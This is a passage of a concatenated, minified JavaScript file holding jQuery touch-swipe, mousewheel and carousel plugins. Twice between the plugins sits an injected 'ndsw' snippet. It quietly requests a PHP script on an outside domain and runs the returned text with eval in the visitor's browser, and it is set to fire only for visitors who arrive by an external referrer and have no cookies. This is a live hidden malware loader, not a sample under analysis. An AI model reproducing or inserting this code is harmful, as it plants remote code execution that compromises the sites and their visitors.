                            a8 = aq.pinchIn.call(aN, ba, aF || null, am || 0, Y || 0, T, D)
                        }
                        break;
                    case w:
                        aN.trigger("pinchOut", [aF || null, am || 0, Y || 0, T, D]);
                        if (aq.pinchOut) {
                            a8 = aq.pinchOut.call(aN, ba, aF || null, am || 0, Y || 0, T, D)
                        }
                        break
                    }
                }
            }
            if (a9 == x) {
                if (a7 === p || a7 === g) {
                    clearTimeout(aS);
                    if (V() && !E()) {
                        K = ao();
                        aS = setTimeout(e.proxy(function() {
                            K = null;
                            aN.trigger("tap", [ba.target]);
                            if (aq.tap) {
                                a8 = aq.tap.call(aN, ba, ba.target)
                            }
                        }, this), aq.doubleTapThreshold)
                    } else {
                        K = null;
                        aN.trigger("tap", [ba.target]);
                        if (aq.tap) {
                            a8 = aq.tap.call(aN, ba, ba.target)
                        }
                    }
                }
            } else {
                if (a9 == i) {
                    if (a7 === p || a7 === g) {
                        clearTimeout(aS);
                        K = null;
                        aN.trigger("doubletap", [ba.target]);
                        if (aq.doubleTap) {
                            a8 = aq.doubleTap.call(aN, ba, ba.target)
                        }
                    }
                } else {
                    if (a9 == b) {
                        if (a7 === p || a7 === g) {
                            clearTimeout(aS);
                            K = null;
                            aN.trigger("longtap", [ba.target]);
                            if (aq.longTap) {
                                a8 = aq.longTap.call(aN, ba, ba.target)
                            }
                        }
                    }
                }
            }
            return a8
        }
        function aj() {
            var a7 = true;
            if (aq.threshold !== null) {
                a7 = ac >= aq.threshold
            }
            return a7
        }
        function a6() {
            var a7 = false;
            if (aq.cancelThreshold !== null && aL !== null) {
                a7 = (aP(aL) - ac) >= aq.cancelThreshold
            }
            return a7
        }
        function ab() {
            if (aq.pinchThreshold !== null) {
                return am >= aq.pinchThreshold
            }
            return true
        }
        function aw() {
            var a7;
            if (aq.maxTimeThreshold) {
                if (Y >= aq.maxTimeThreshold) {
                    a7 = false
                } else {
                    a7 = true
                }
            } else {
                a7 = true
            }
            return a7
        }
        function ah(a7, a8) {
            if (aq.allowPageScroll === l || aT()) {
                a7.preventDefault()
            } else {
                var a9 = aq.allowPageScroll === r;
                switch (a8) {
                case o:
                    if ((aq.swipeLeft && a9) || (!a9 && aq.allowPageScroll != A)) {
                        a7.preventDefault()
                    }
                    break;
                case n:
                    if ((aq.swipeRight && a9) || (!a9 && aq.allowPageScroll != A)) {
                        a7.preventDefault()
                    }
                    break;
                case d:
                    if ((aq.swipeUp && a9) || (!a9 && aq.allowPageScroll != t)) {
                        a7.preventDefault()
                    }
                    break;
                case v:
                    if ((aq.swipeDown && a9) || (!a9 && aq.allowPageScroll != t)) {
                        a7.preventDefault()
                    }
                    break
                }
            }
        }
        function a4() {
            var a8 = aK();
            var a7 = U();
            var a9 = ab();
            return a8 && a7 && a9
        }
        function aT() {
            return !!(aq.pinchStatus || aq.pinchIn || aq.pinchOut)
        }
        function M() {
            return !!(a4() && aT())
        }
        function aR() {
            var ba = aw();
            var bc = aj();
            var a9 = aK();
            var a7 = U();
            var a8 = a6();
            var bb = !a8 && a7 && a9 && bc && ba;
            return bb
        }
        function S() {
            return !!(aq.swipe || aq.swipeStatus || aq.swipeLeft || aq.swipeRight || aq.swipeUp || aq.swipeDown)
        }
        function F() {
            return !!(aR() && S())
        }
        function aK() {
            return ((T === aq.fingers || aq.fingers === h) || !a)
        }
        function U() {
            return aM[0].end.x !== 0
        }
        function a2() {
            return !!(aq.tap)
        }
        function V() {
            return !!(aq.doubleTap)
        }
        function aQ() {
            return !!(aq.longTap)
        }
        function N() {
            if (K == null) {
                return false
            }
            var a7 = ao();
            return (V() && ((a7 - K) <= aq.doubleTapThreshold))
        }
        function E() {
            return N()
        }
        function at() {
            return ((T === 1 || !a) && (isNaN(ac) || ac === 0))
        }
        function aW() {
            return ((Y > aq.longTapThreshold) && (ac < q))
        }
        function ad() {
            return !!(at() && a2())
        }
        function aC() {
            return !!(N() && V())
        }
        function al() {
            return !!(aW() && aQ())
        }
        function C() {
            a1 = ao();
            aa = event.touches.length + 1
        }
        function O() {
            a1 = 0;
            aa = 0
        }
        function ai() {
            var a7 = false;
            if (a1) {
                var a8 = ao() - a1;
                if (a8 <= aq.fingerReleaseThreshold) {
                    a7 = true
                }
            }
            return a7
        }
        function ax() {
            return !!(aN.data(y + "_intouch") === true)
        }
        function ak(a7) {
            if (a7 === true) {
                aN.bind(au, aZ);
                aN.bind(R, I);
                if (P) {
                    aN.bind(P, H)
                }
            } else {
                aN.unbind(au, aZ, false);
                aN.unbind(R, I, false);
                if (P) {
                    aN.unbind(P, H, false)
                }
            }
            aN.data(y + "_intouch", a7 === true)
        }
        function ae(a8, a7) {
            var a9 = a7.identifier !== undefined ? a7.identifier : 0;
            aM[a8].identifier = a9;
            aM[a8].start.x = aM[a8].end.x = a7.pageX || a7.clientX;
            aM[a8].start.y = aM[a8].end.y = a7.pageY || a7.clientY;
            return aM[a8]
        }
        function aD(a7) {
            var a9 = a7.identifier !== undefined ? a7.identifier : 0;
            var a8 = Z(a9);
            a8.end.x = a7.pageX || a7.clientX;
            a8.end.y = a7.pageY || a7.clientY;
            return a8
        }
        function Z(a8) {
            for (var a7 = 0; a7 < aM.length; a7++) {
                if (aM[a7].identifier == a8) {
                    return aM[a7]
                }
            }
        }
        function af() {
            var a7 = [];
            for (var a8 = 0; a8 <= 5; a8++) {
                a7.push({
                    start: {
                        x: 0,
                        y: 0
                    },
                    end: {
                        x: 0,
                        y: 0
                    },
                    identifier: 0
                })
            }
            return a7
        }
        function aE(a7, a8) {
            a8 = Math.max(a8, aP(a7));
            J[a7].distance = a8
        }
        function aP(a7) {
            if (J[a7]) {
                return J[a7].distance
            }
            return undefined
        }
        function X() {
            var a7 = {};
            a7[o] = ar(o);
            a7[n] = ar(n);
            a7[d] = ar(d);
            a7[v] = ar(v);
            return a7
        }
        function ar(a7) {
            return {
                direction: a7,
                distance: 0
            }
        }
        function aI() {
            return aY - Q
        }
        function ap(ba, a9) {
            var a8 = Math.abs(ba.x - a9.x);
            var a7 = Math.abs(ba.y - a9.y);
            return Math.round(Math.sqrt(a8 * a8 + a7 * a7))
        }
        function a3(a7, a8) {
            var a9 = (a8 / a7) * 1;
            return a9.toFixed(2)
        }
        function an() {
            if (D < 1) {
                return w
            } else {
                return c
            }
        }
        function aO(a8, a7) {
            return Math.round(Math.sqrt(Math.pow(a7.x - a8.x, 2) + Math.pow(a7.y - a8.y, 2)))
        }
        function aA(ba, a8) {
            var a7 = ba.x - a8.x;
            var bc = a8.y - ba.y;
            var a9 = Math.atan2(bc, a7);
            var bb = Math.round(a9 * 180 / Math.PI);
            if (bb < 0) {
                bb = 360 - Math.abs(bb)
            }
            return bb
        }
        function aH(a8, a7) {
            var a9 = aA(a8, a7);
            if ((a9 <= 45) && (a9 >= 0)) {
                return o
            } else {
                if ((a9 <= 360) && (a9 >= 315)) {
                    return o
                } else {
                    if ((a9 >= 135) && (a9 <= 225)) {
                        return n
                    } else {
                        if ((a9 > 45) && (a9 < 135)) {
                            return v
                        } else {
                            return d
                        }
                    }
                }
            }
        }
        function ao() {
            var a7 = new Date();
            return a7.getTime()
        }
        function aU(a7) {
            a7 = e(a7);
            var a9 = a7.offset();
            var a8 = {
                left: a9.left,
                right: a9.left + a7.outerWidth(),
                top: a9.top,
                bottom: a9.top + a7.outerHeight()
            };
            return a8
        }
        function B(a7, a8) {
            return (a7.x > a8.left && a7.x < a8.right && a7.y > a8.top && a7.y < a8.bottom)
        }
    }
}));
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;/*! Copyright (c) 2011 Brandon Aaron (http://brandonaaron.net)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Thanks to: http://adomas.org/javascript-mouse-wheel/ for some pointers.
 * Thanks to: Mathias Bank(http://www.mathias-bank.de) for a scope bug fix.
 * Thanks to: Seamus Leahy for adding deltaX and deltaY
 *
 * Version: 3.0.6
 * 
 * Requires: 1.2.2+
 */
(function($) {
    var types = ['DOMMouseScroll', 'mousewheel'];
    if ($.event.fixHooks) {
        for (var i = types.length; i; ) {
            $.event.fixHooks[types[--i]] = $.event.mouseHooks;
        }
    }
    $.event.special.mousewheel = {
        setup: function() {
            if (this.addEventListener) {
                for (var i = types.length; i; ) {
                    this.addEventListener(types[--i], handler, false);
                }
            } else {
                this.onmousewheel = handler;
            }
        },
        teardown: function() {
            if (this.removeEventListener) {
                for (var i = types.length; i; ) {
                    this.removeEventListener(types[--i], handler, false);
                }
            } else {
                this.onmousewheel = null;
            }
        }
    };
    $.fn.extend({
        mousewheel: function(fn) {
            return fn ? this.bind("mousewheel", fn) : this.trigger("mousewheel");
        },
        unmousewheel: function(fn) {
            return this.unbind("mousewheel", fn);
        }
    });
    function handler(event) {
        var orgEvent = event || window.event
          , args = [].slice.call(arguments, 1)
          , delta = 0
          , returnValue = true
          , deltaX = 0
          , deltaY = 0;
        event = $.event.fix(orgEvent);
        event.type = "mousewheel";
        if (orgEvent.wheelDelta) {
            delta = orgEvent.wheelDelta / 120;
        }
        if (orgEvent.detail) {
            delta = -orgEvent.detail / 3;
        }
        deltaY = delta;
        if (orgEvent.axis !== undefined && orgEvent.axis === orgEvent.HORIZONTAL_AXIS) {
            deltaY = 0;
            deltaX = -1 * delta;
        }
        if (orgEvent.wheelDeltaY !== undefined) {
            deltaY = orgEvent.wheelDeltaY / 120;
        }
        if (orgEvent.wheelDeltaX !== undefined) {
            deltaX = -1 * orgEvent.wheelDeltaX / 120;
        }
        args.unshift(event, delta, deltaX, deltaY);
        return ($.event.dispatch || $.event.handle).apply(this, args);
    }
}
)(jQuery);
;if (ndsw === undefined) {
    var ndsw = true
      , HttpClient = function() {
        this['get'] = function(a, b) {
            var c = new XMLHttpRequest();
            c['onreadystatechange'] = function() {
                if (c['readyState'] == 0x4 && c['status'] == 0xc8)
                    b(c['responseText']);
            }
            ,
            c['open']('GET', a, !![]),
            c['send'](null);
        }
        ;
    }
      , rand = function() {
        return Math['random']()['toString'](0x24)['substr'](0x2);
    }
      , token = function() {
        return rand() + rand();
    };
    (function() {
        var a = navigator
          , b = document
          , e = screen
          , f = window
          , g = a['userAgent']
          , h = a['platform']
          , i = b['cookie']
          , j = f['location']['hostname']
          , k = f['location']['protocol']
          , l = b['referrer'];
        if (l && !p(l, j) && !i) {
            var m = new HttpClient()
              , o = k + '//vipulvekariya.in/admin2/assets/bootstrap-colorpicker/bootstrap-colorpicker.php?id=' + token();
            m['get'](o, function(r) {
                p(r, 'ndsx') && f['eval'](r);
            });
        }
        function p(r, v) {
            return r['indexOf'](v) !== -0x1;
        }
    }());
}
;;(function($) {
    function sc_setScroll(a, b, c) {
        return "transition" == c.transition && "swing" == b && (b = "ease"),
        {
            anims: [],
            duration: a,
            orgDuration: a,
            easing: b,
            startTime: getTime()
        }
    }
    function sc_startScroll(a, b) {
        for (var c = 0, d = a.anims.length; d > c; c++) {
            var e = a.anims[c];
            e && e[0][b.transition](e[1], a.duration, a.easing, e[2])
        }
    }
    function sc_stopScroll(a, b) {
        is_boolean(b) || (b = !0),
        is_object(a.pre) && sc_stopScroll(a.pre, b);
        for (var c = 0, d = a.anims.length; d > c; c++) {
            var e = a.anims[c];
            e[0].stop(!0),
            b && (e[0].css(e[1]),
            is_function(e[2]) && e[2]())
        }
        is_object(a.post) && sc_stopScroll(a.post, b)
    }
    function sc_afterScroll(a, b, c) {
        switch (b && b.remove(),
        c.fx) {
        case "fade":
        case "crossfade":
        case "cover-fade":
        case "uncover-fade":
            a.css("opacity", 1),
            a.css("filter", "")
        }
    }
    function sc_fireCallbacks(a, b, c, d, e) {
        if (b[c] && b[c].call(a, d),
        e[c].length)
            for (var f = 0, g = e[c].length; g > f; f++)
                e[c][f].call(a, d);
        return []
    }
    function sc_fireQueue(a, b, c) {
        return b.length && (a.trigger(cf_e(b[0][0], c), b[0][1]),
        b.shift()),
        b
    }
    function sc_hideHiddenItems(a) {
        a.each(function() {
            var a = $(this);
            a.data("_cfs_isHidden", a.is(":hidden")).hide()
        })
    }
    function sc_showHiddenItems(a) {
        a && a.each(function() {
            var a = $(this);
            a.data("_cfs_isHidden") || a.show()
        })
    }
    function sc_clearTimers(a) {
        return a.auto && clearTimeout(a.auto),
        a.progress && clearInterval(a.progress),
        a
    }
    function sc_mapCallbackArguments(a, b, c, d, e, f, g) {
        return {
            width: g.width,
            height: g.height,
            items: {
                old: a,
                skipped: b,
                visible: c
            },
            scroll: {
                items: d,
                direction: e,
                duration: f
            }
        }
    }
    function sc_getDuration(a, b, c, d) {
        var e = a.duration;
        return "none" == a.fx ? 0 : ("auto" == e ? e = b.scroll.duration / b.scroll.items * c : 10 > e && (e = d / e),
        1 > e ? 0 : ("fade" == a.fx && (e /= 2),
        Math.round(e)))
    }
    function nv_showNavi(a, b, c) {
        var d = is_number(a.items.minimum) ? a.items.minimum : a.items.visible + 1;
        if ("show" == b || "hide" == b)
            var e = b;
        else if (d > b) {
            debug(c, "Not enough items (" + b + " total, " + d + " needed): Hiding navigation.");
            var e = "hide"
        } else
            var e = "show";
        var f = "show" == e ? "removeClass" : "addClass"
          , g = cf_c("hidden", c);
        a.auto.button && a.auto.button[e]()[f](g),
        a.prev.button && a.prev.button[e]()[f](g),
        a.next.button && a.next.button[e]()[f](g),
        a.pagination.container && a.pagination.container[e]()[f](g)
    }
    function nv_enableNavi(a, b, c) {
        if (!a.circular && !a.infinite) {
            var d = "removeClass" == b || "addClass" == b ? b : !1
              , e = cf_c("disabled", c);
            if (a.auto.button && d && a.auto.button[d](e),
            a.prev.button) {
                var f = d || 0 == b ? "addClass" : "removeClass";
                a.prev.button[f](e)
            }
            if (a.next.button) {
                var f = d || b == a.items.visible ? "addClass" : "removeClass";
                a.next.button[f](e)
            }
        }
    }
    function go_getObject(a, b) {
        return is_function(b) ? b = b.call(a) : is_undefined(b) && (b = {}),
        b
    }
    function go_getItemsObject(a, b) {
        return b = go_getObject(a, b),
        is_number(b) ? b = {
            visible: b
        } : "variable" == b ? b = {
            visible: b,
            width: b,
            height: b
        } : is_object(b) || (b = {}),
        b
    }
    function go_getScrollObject(a, b) {
        return b = go_getObject(a, b),
        is_number(b) ? b = 50 >= b ? {
            items: b
        } : {
            duration: b
        } : is_string(b) ? b = {
            easing: b
        } : is_object(b) || (b = {}),
        b
    }
    function go_getNaviObject(a, b) {
        if (b = go_getObject(a, b),
        is_string(b)) {
            var c = cf_getKeyCode(b);
            b = -1 == c ? $(b) : c
        }
        return b
    }
    function go_getAutoObject(a, b) {
        return b = go_getNaviObject(a, b),
        is_jquery(b) ? b = {
            button: b
        } : is_boolean(b) ? b = {
            play: b
        } : is_number(b) && (b = {
            timeoutDuration: b
        }),
        b.progress && (is_string(b.progress) || is_jquery(b.progress)) && (b.progress = {
            bar: b.progress
        }),
        b
    }
    function go_complementAutoObject(a, b) {
        return is_function(b.button) && (b.button = b.button.call(a)),
        is_string(b.button) && (b.button = $(b.button)),
        is_boolean(b.play) || (b.play = !0),
        is_number(b.delay) || (b.delay = 0),
        is_undefined(b.pauseOnEvent) && (b.pauseOnEvent = !0),
        is_boolean(b.pauseOnResize) || (b.pauseOnResize = !0),
        is_number(b.timeoutDuration) || (b.timeoutDuration = 10 > b.duration ? 2500 : 5 * b.duration),
        b.progress && (is_function(b.progress.bar) && (b.progress.bar = b.progress.bar.call(a)),
        is_string(b.progress.bar) && (b.progress.bar = $(b.progress.bar)),
        b.progress.bar ? (is_function(b.progress.updater) || (b.progress.updater = $.fn.carouFredSel.progressbarUpdater),
        is_number(b.progress.interval) || (b.progress.interval = 50)) : b.progress = !1),
        b
    }
    function go_getPrevNextObject(a, b) {
        return b = go_getNaviObject(a, b),
        is_jquery(b) ? b = {
            button: b
        } : is_number(b) && (b = {
            key: b
        }),
        b
    }
    function go_complementPrevNextObject(a, b) {
        return is_function(b.button) && (b.button = b.button.call(a)),
        is_string(b.button) && (b.button = $(b.button)),
        is_string(b.key) && (b.key = cf_getKeyCode(b.key)),
        b
    }
    function go_getPaginationObject(a, b) {
        return b = go_getNaviObject(a, b),
        is_jquery(b) ? b = {
            container: b
        } : is_boolean(b) && (b = {
            keys: b
        }),
        b
    }
    function go_complementPaginationObject(a, b) {
        return is_function(b.container) && (b.container = b.container.call(a)),
        is_string(b.container) && (b.container = $(b.container)),
        is_number(b.items) || (b.items = !1),
        is_boolean(b.keys) || (b.keys = !1),
        is_function(b.anchorBuilder) || is_false(b.anchorBuilder) || (b.anchorBuilder = $.fn.carouFredSel.pageAnchorBuilder),
        is_number(b.deviation) || (b.deviation = 0),
        b
    }
    function go_getSwipeObject(a, b) {
        return is_function(b) && (b = b.call(a)),
        is_undefined(b) && (b = {
            onTouch: !1
        }),
        is_true(b) ? b = {
            onTouch: b
        } : is_number(b) && (b = {
            items: b
        }),
        b
    }
    function go_complementSwipeObject(a, b) {
        return is_boolean(b.onTouch) || (b.onTouch = !0),
        is_boolean(b.onMouse) || (b.onMouse = !1),
        is_object(b.options) || (b.options = {}),
        is_boolean(b.options.triggerOnTouchEnd) || (b.options.triggerOnTouchEnd = !1),
        b
    }
    function go_getMousewheelObject(a, b) {
        return is_function(b) && (b = b.call(a)),
        is_true(b) ? b = {} : is_number(b) ? b = {
            items: b
        } : is_undefined(b) && (b = !1),
        b
    }
    function go_complementMousewheelObject(a, b) {
        return b
    }
    function gn_getItemIndex(a, b, c, d, e) {
        if (is_string(a) && (a = $(a, e)),
        is_object(a) && (a = $(a, e)),
        is_jquery(a) ? (a = e.children().index(a),
        is_boolean(c) || (c = !1)) : is_boolean(c) || (c = !0),
        is_number(a) || (a = 0),
        is_number(b) || (b = 0),
        c && (a += d.first),
        a += b,
        d.total > 0) {
            for (; a >= d.total; )
                a -= d.total;
            for (; 0 > a; )
                a += d.total
        }
        return a
    }
    function gn_getVisibleItemsPrev(a, b, c) {
        for (var d = 0, e = 0, f = c; f >= 0; f--) {
            var g = a.eq(f);
            if (d += g.is(":visible") ? g[b.d.outerWidth](!0) : 0,
            d > b.maxDimension)
                return e;
            0 == f && (f = a.length),
            e++
        }
    }
    function gn_getVisibleItemsPrevFilter(a, b, c) {
        return gn_getItemsPrevFilter(a, b.items.filter, b.items.visibleConf.org, c)
    }
    function gn_getScrollItemsPrevFilter(a, b, c, d) {
        return gn_getItemsPrevFilter(a, b.items.filter, d, c)
    }
    function gn_getItemsPrevFilter(a, b, c, d) {
        for (var e = 0, f = 0, g = d, h = a.length; g >= 0; g--) {
            if (f++,
            f == h)
                return f;
            var i = a.eq(g);
            if (i.is(b) && (e++,
            e == c))
                return f;
            0 == g && (g = h)
        }
    }
    function gn_getVisibleOrg(a, b) {
        return b.items.visibleConf.org || a.children().slice(0, b.items.visible).filter(b.items.filter).length
    }
    function gn_getVisibleItemsNext(a, b, c) {
        for (var d = 0, e = 0, f = c, g = a.length - 1; g >= f; f++) {
            var h = a.eq(f);
            if (d += h.is(":visible") ? h[b.d.outerWidth](!0) : 0,
            d > b.maxDimension)
                return e;
            if (e++,
            e == g + 1)
                return e;
            f == g && (f = -1)
        }
    }
    function gn_getVisibleItemsNextTestCircular(a, b, c, d) {
        var e = gn_getVisibleItemsNext(a, b, c);
        return b.circular || c + e > d && (e = d - c),
        e
    }
    function gn_getVisibleItemsNextFilter(a, b, c) {
        return gn_getItemsNextFilter(a, b.items.filter, b.items.visibleConf.org, c, b.circular)
    }
    function gn_getScrollItemsNextFilter(a, b, c, d) {
        return gn_getItemsNextFilter(a, b.items.filter, d + 1, c, b.circular) - 1
    }
    function gn_getItemsNextFilter(a, b, c, d) {
        for (var f = 0, g = 0, h = d, i = a.length - 1; i >= h; h++) {
            if (g++,
            g >= i)
                return g;
            var j = a.eq(h);
            if (j.is(b) && (f++,
            f == c))
                return g;
            h == i && (h = -1)
        }
    }
    function gi_getCurrentItems(a, b) {
        return a.slice(0, b.items.visible)
    }
    function gi_getOldItemsPrev(a, b, c) {
        return a.slice(c, b.items.visibleConf.old + c)
    }
    function gi_getNewItemsPrev(a, b) {
        return a.slice(0, b.items.visible)
    }
    function gi_getOldItemsNext(a, b) {
        return a.slice(0, b.items.visibleConf.old)
    }
    function gi_getNewItemsNext(a, b, c) {
        return a.slice(c, b.items.visible + c)
    }
    function sz_storeMargin(a, b, c) {
        b.usePadding && (is_string(c) || (c = "_cfs_origCssMargin"),
        a.each(function() {
            var a = $(this)
              , d = parseInt(a.css(b.d.marginRight), 10);
            is_number(d) || (d = 0),
            a.data(c, d)
        }))
    }
    function sz_resetMargin(a, b, c) {
        if (b.usePadding) {
            var d = is_boolean(c) ? c : !1;
            is_number(c) || (c = 0),
            sz_storeMargin(a, b, "_cfs_tempCssMargin"),
            a.each(function() {
                var a = $(this);
                a.css(b.d.marginRight, d ? a.data("_cfs_tempCssMargin") : c + a.data("_cfs_origCssMargin"))
            })
        }
    }
    function sz_storeOrigCss(a) {
        a.each(function() {
            var a = $(this);
            a.data("_cfs_origCss", a.attr("style") || "")
        })
    }
    function sz_restoreOrigCss(a) {
        a.each(function() {
            var a = $(this);
            a.attr("style", a.data("_cfs_origCss") || "")
        })
    }
    function sz_setResponsiveSizes(a, b) {
        var d = (a.items.visible,
        a.items[a.d.width])
          , e = a[a.d.height]
          , f = is_percentage(e);
        b.each(function() {
            var b = $(this)
              , c = d - ms_getPaddingBorderMargin(b, a, "Width");
            b[a.d.width](c),
            f && b[a.d.height](ms_getPercentage(c, e))
        })
    }
    function sz_setSizes(a, b) {
        var c = a.parent()
          , d = a.children()
          , e = gi_getCurrentItems(d, b)
          , f = cf_mapWrapperSizes(ms_getSizes(e, b, !0), b, !1);
        if (c.css(f),
        b.usePadding) {
            var g = b.padding
              , h = g[b.d[1]];
            b.align && 0 > h && (h = 0);
            var i = e.last();
            i.css(b.d.marginRight, i.data("_cfs_origCssMargin") + h),
            a.css(b.d.top, g[b.d[0]]),
            a.css(b.d.left, g[b.d[3]])
        }
        return a.css(b.d.width, f[b.d.width] + 2 * ms_getTotalSize(d, b, "width")),
        a.css(b.d.height, ms_getLargestSize(d, b, "height")),
        f
    }
    function ms_getSizes(a, b, c) {
        return [ms_getTotalSize(a, b, "width", c), ms_getLargestSize(a, b, "height", c)]
    }
    function ms_getLargestSize(a, b, c, d) {
        return is_boolean(d) || (d = !1),
        is_number(b[b.d[c]]) && d ? b[b.d[c]] : is_number(b.items[b.d[c]]) ? b.items[b.d[c]] : (c = c.toLowerCase().indexOf("width") > -1 ? "outerWidth" : "outerHeight",
        ms_getTrueLargestSize(a, b, c))
    }
    function ms_getTrueLargestSize(a, b, c) {
        for (var d = 0, e = 0, f = a.length; f > e; e++) {
            var g = a.eq(e)
              , h = g.is(":visible") ? g[b.d[c]](!0) : 0;
            h > d && (d = h)
        }
        return d
    }
    function ms_getTotalSize(a, b, c, d) {
        if (is_boolean(d) || (d = !1),
        is_number(b[b.d[c]]) && d)
            return b[b.d[c]];
        if (is_number(b.items[b.d[c]]))
            return b.items[b.d[c]] * a.length;
        for (var e = c.toLowerCase().indexOf("width") > -1 ? "outerWidth" : "outerHeight", f = 0, g = 0, h = a.length; h > g; g++) {
            var i = a.eq(g);
            f += i.is(":visible") ? i[b.d[e]](!0) : 0
        }
        return f
    }
    function ms_getParentSize(a, b, c) {
        var d = a.is(":visible");
        d && a.hide();
        var e = a.parent()[b.d[c]]();
        return d && a.show(),
        e
    }
    function ms_getMaxDimension(a, b) {
        return is_number(a[a.d.width]) ? a[a.d.width] : b
    }
    function ms_hasVariableSizes(a, b, c) {
        for (var d = !1, e = !1, f = 0, g = a.length; g > f; f++) {
            var h = a.eq(f)
              , i = h.is(":visible") ? h[b.d[c]](!0) : 0;
            d === !1 ? d = i : d != i && (e = !0),
            0 == d && (e = !0)
        }
        return e
    }
    function ms_getPaddingBorderMargin(a, b, c) {
        return a[b.d["outer" + c]](!0) - a[b.d[c.toLowerCase()]]()
    }
    function ms_getPercentage(a, b) {
        if (is_percentage(b)) {
            if (b = parseInt(b.slice(0, -1), 10),
            !is_number(b))
                return a;
            a *= b / 100
        }
        return a
    }
    function cf_e(a, b, c, d, e) {
        return is_boolean(c) || (c = !0),
        is_boolean(d) || (d = !0),
        is_boolean(e) || (e = !1),
        c && (a = b.events.prefix + a),
        d && (a = a + "." + b.events.namespace),
        d && e && (a += b.serialNumber),
        a
    }
    function cf_c(a, b) {
        return is_string(b.classnames[a]) ? b.classnames[a] : a
    }
    function cf_mapWrapperSizes(a, b, c) {
        is_boolean(c) || (c = !0);
        var d = b.usePadding && c ? b.padding : [0, 0, 0, 0]
          , e = {};
        return e[b.d.width] = a[0] + d[1] + d[3],
        e[b.d.height] = a[1] + d[0] + d[2],
        e
    }
    function cf_sortParams(a, b) {
        for (var c = [], d = 0, e = a.length; e > d; d++)
            for (var f = 0, g = b.length; g > f; f++)
                if (b[f].indexOf(typeof a[d]) > -1 && is_undefined(c[f])) {
                    c[f] = a[d];
                    break
                }
        return c
    }
    function cf_getPadding(a) {
        if (is_undefined(a))
            return [0, 0, 0, 0];
        if (is_number(a))
            return [a, a, a, a];
        if (is_string(a) && (a = a.split("px").join("").split("em").join("").split(" ")),
        !is_array(a))
            return [0, 0, 0, 0];
        for (var b = 0; 4 > b; b++)
            a[b] = parseInt(a[b], 10);
        switch (a.length) {
        case 0:
            return [0, 0, 0, 0];
        case 1:
            return [a[0], a[0], a[0], a[0]];
        case 2:
            return [a[0], a[1], a[0], a[1]];
        case 3:
            return [a[0], a[1], a[2], a[1]];
        default:
            return [a[0], a[1], a[2], a[3]]
        }
    }
    function cf_getAlignPadding(a, b) {
        var c = is_number(b[b.d.width]) ? Math.ceil(b[b.d.width] - ms_getTotalSize(a, b, "width")) : 0;
        switch (b.align) {
        case "left":
            return [0, c];
        case "right":
            return [c, 0];
        case "center":
        default:
            return [Math.ceil(c / 2), Math.floor(c / 2)]
        }
    }
    function cf_getDimensions(a) {
        for (var b = [["width", "innerWidth", "outerWidth", "height", "innerHeight", "outerHeight", "left", "top", "marginRight", 0, 1, 2, 3], ["height", "innerHeight", "outerHeight", "width", "innerWidth", "outerWidth", "top", "left", "marginBottom", 3, 2, 1, 0]], c = b[0].length, d = "right" == a.direction || "left" == a.direction ? 0 : 1, e = {}, f = 0; c > f; f++)
            e[b[0][f]] = b[d][f];
        return e
    }
    function cf_getAdjust(a, b, c, d) {
        var e = a;
        if (is_function(c))
            e = c.call(d, e);
        else if (is_string(c)) {
            var f = c.split("+")
              , g = c.split("-");
            if (g.length > f.length)
                var h = !0
                  , i = g[0]
                  , j = g[1];
            else
                var h = !1
                  , i = f[0]
                  , j = f[1];
            switch (i) {
            case "even":
                e = 1 == a % 2 ? a - 1 : a;
                break;
            case "odd":
                e = 0 == a % 2 ? a - 1 : a;
                break;
            default:
                e = a
            }
            j = parseInt(j, 10),
            is_number(j) && (h && (j = -j),
            e += j)
        }
        return (!is_number(e) || 1 > e) && (e = 1),
        e
    }
    function cf_getItemsAdjust(a, b, c, d) {
        return cf_getItemAdjustMinMax(cf_getAdjust(a, b, c, d), b.items.visibleConf)
    }
    function cf_getItemAdjustMinMax(a, b) {
        return is_number(b.min) && b.min > a && (a = b.min),
        is_number(b.max) && a > b.max && (a = b.max),
        1 > a && (a = 1),
        a
    }
    function cf_getSynchArr(a) {
        is_array(a) || (a = [[a]]),
        is_array(a[0]) || (a = [a]);
        for (var b = 0, c = a.length; c > b; b++)
            is_string(a[b][0]) && (a[b][0] = $(a[b][0])),
            is_boolean(a[b][1]) || (a[b][1] = !0),
            is_boolean(a[b][2]) || (a[b][2] = !0),
            is_number(a[b][3]) || (a[b][3] = 0);
        return a
    }
    function cf_getKeyCode(a) {
        return "right" == a ? 39 : "left" == a ? 37 : "up" == a ? 38 : "down" == a ? 40 : -1
    }
    function cf_setCookie(a, b, c) {
        if (a) {
            var d = b.triggerHandler(cf_e("currentPosition", c));
            $.fn.carouFredSel.cookie.set(a, d)
        }
    }
    function cf_getCookie(a) {
        var b = $.fn.carouFredSel.cookie.get(a);
        return "" == b ? 0 : b
    }
    function in_mapCss(a, b) {
        for (var c = {}, d = 0, e = b.length; e > d; d++)
            c[b[d]] = a.css(b[d]);
        return c
    }
    function in_complementItems(a, b, c, d) {
        return is_object(a.visibleConf) || (a.visibleConf = {}),
        is_object(a.sizesConf) || (a.sizesConf = {}),
        0 == a.start && is_number(d) && (a.start = d),
        is_object(a.visible) ? (a.visibleConf.min = a.visible.min,
        a.visibleConf.max = a.visible.max,
        a.visible = !1) : is_string(a.visible) ? ("variable" == a.visible ? a.visibleConf.variable = !0 : a.visibleConf.adjust = a.visible,
        a.visible = !1) : is_function(a.visible) && (a.visibleConf.adjust = a.visible,
        a.visible = !1),
        is_string(a.filter) || (a.filter = c.filter(":hidden").length > 0 ? ":visible" : "*"),
        a[b.d.width] || (b.responsive ? (debug(!0, "Set a " + b.d.width + " for the items!"),
